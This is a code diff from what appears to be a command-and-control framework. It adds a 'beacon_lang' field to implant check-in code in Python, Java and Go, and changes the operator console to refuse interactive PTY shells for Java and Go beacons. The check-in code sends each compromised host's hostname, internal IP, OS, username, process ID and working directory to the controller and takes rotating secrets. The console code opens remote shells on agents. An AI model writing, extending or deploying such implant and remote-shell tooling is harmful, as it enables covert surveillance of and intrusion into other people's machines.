@@ -3758,6 +3758,7 @@ def checkin():
         "pid":            os.getpid(),
         "sleep_interval": SLEEP,
         "cwd":            _cwd,
+        "beacon_lang":    "python",
     })
     if _r and _r.get("new_secret"): SECRET = _r["new_secret"]
     return _r
@@ -4187,7 +4188,8 @@ public class Beacon {
             "\\"username\\":\\"" + jsonEscape(username) + "\\"," +
             "\\"pid\\":" + pid + "," +
             "\\"sleep_interval\\":" + SLEEP + "," +
-            "\\"cwd\\":\\"" + jsonEscape(cwd) + "\\"}";
+            "\\"cwd\\":\\"" + jsonEscape(cwd) + "\\"," +
+            "\\"beacon_lang\\":\\"java\\"}";
         String resp = post(${xL('/api/beacon/checkin')}, payload);
         if (resp != null) {
             String ns = jsonGet(resp, "new_secret");
@@ -4682,7 +4684,7 @@ func _checkin() map[string]interface{} {
 \tresp := _post("/api/beacon/checkin", map[string]interface{}{
 \t\t"agent_id": _agentID, "hostname": _hostname(), "ip_internal": _localIP(),
 \t\t"os_info": _osInfo(), "username": _username(), "pid": os.Getpid(),
-\t\t"sleep_interval": _sleep, "cwd": _cwd,
+\t\t"sleep_interval": _sleep, "cwd": _cwd, "beacon_lang": "go",
 \t})
 \tif resp != nil {
 \t\tif ns, ok := resp["new_secret"].(string); ok && ns != "" { _mu.Lock(); _secret = ns; _mu.Unlock() }
@@ -5015,10 +5017,23 @@ async function openPtyShell(agentId) {
   _ptyFitAddon = null;
   document.getElementById('pty-terminal').innerHTML = '';
 
-  // Fetch agent OS to know if Windows (for local echo)
+  // Fetch agent info to know OS and beacon language
   const agentRes = await apiFetch('/api/agents/' + agentId);
   const agentInfo = agentRes && agentRes.ok ? await agentRes.json() : {};
   _ptyIsWin = (agentInfo.os_info || '').toLowerCase().includes('windows');
+  const _beaconLang = (agentInfo.beacon_lang || '').toLowerCase();
+
+  // Java and Go beacons don't support PTY
+  if (_beaconLang === 'java' || _beaconLang === 'go') {
+    document.getElementById('pty-status').textContent = `✗ PTY not supported for ${_beaconLang.toUpperCase()} beacons`;
+    document.getElementById('pty-status').style.color = 'var(--danger)';
+    document.getElementById('pty-terminal').innerHTML =
+      `<div style="padding:24px;color:var(--text3);font-family:var(--font-mono);font-size:13px">` +
+      `<p style="color:var(--danger);font-size:15px">⚠ PTY not supported for ${_beaconLang.toUpperCase()} beacons</p>` +
+      `<p>Interactive shell (PTY) is only available for <strong>Python</strong> beacons.</p>` +
+      `<p>To run commands on this agent, use the command panel below.</p></div>`;
+    return;
+  }
 
   // Start PTY session on server
   const res = await apiFetch(`/api/pty/${agentId}/start`, { method: 'POST' });
